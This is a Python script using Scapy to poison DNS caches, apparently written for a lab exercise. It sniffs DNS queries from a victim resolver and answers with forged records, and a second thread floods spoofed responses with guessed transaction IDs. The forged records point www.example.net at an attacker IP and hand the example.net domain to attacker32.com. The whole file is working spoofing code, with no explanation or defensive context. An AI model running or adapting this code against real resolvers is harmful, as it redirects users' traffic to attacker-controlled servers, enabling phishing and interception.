from scapy.all import *
import time
import random
import threading

def spoof_dns(pkt):
    if not DNS in pkt:
        return
    
    query_name = pkt[DNS].qd.qname
    query_type = pkt[DNS].qd.qtype
    
    if b'www.example.net' in query_name and query_type == 1:
        for i in range(3):
            ip = IP(dst=pkt[IP].src, src=pkt[IP].dst)
            udp = UDP(dport=pkt[UDP].sport, sport=53)
            
            dns_response = DNS(
                id=pkt[DNS].id,
                qr=1, aa=1, rd=0,
                qd=pkt[DNS].qd,
                an=DNSRR(rrname=pkt[DNS].qd.qname, type='A', ttl=259200, rdata='20.0.6.14'),
                ns=DNSRR(rrname='example.net', type='NS', ttl=259200, rdata='attacker32.com'),
                ar=DNSRR(rrname='attacker32.com', type='A', ttl=259200, rdata='20.0.8.27')
            )
            
            send(ip/udp/dns_response, verbose=0)
            time.sleep(0.01)

def proactive_attack():
    for i in range(100):
        trans_id = random.randint(1, 65535)
        
        ip = IP(dst="10.10.27.2", src="8.8.8.8")
        udp = UDP(dport=53, sport=53)
        dns = DNS(
            id=trans_id,
            qr=1, aa=1, rd=0,
            qd=DNSQR(qname="www.example.net", qtype="A"),
            an=DNSRR(rrname="www.example.net", type="A", ttl=259200, rdata="20.0.6.14"),
            ns=DNSRR(rrname="example.net", type="NS", ttl=259200, rdata="attacker32.com"),
            ar=DNSRR(rrname="attacker32.com", type="A", ttl=259200, rdata="20.0.8.27")
        )
        
        send(ip/udp/dns, verbose=0)
        time.sleep(0.1)

proactive_thread = threading.Thread(target=proactive_attack)
proactive_thread.start()

sniff(filter='udp and port 53 and src host 10.10.27.2', 
      prn=spoof_dns, 
      iface="br-35bfec57ccd3",
      timeout=180)

proactive_thread.join()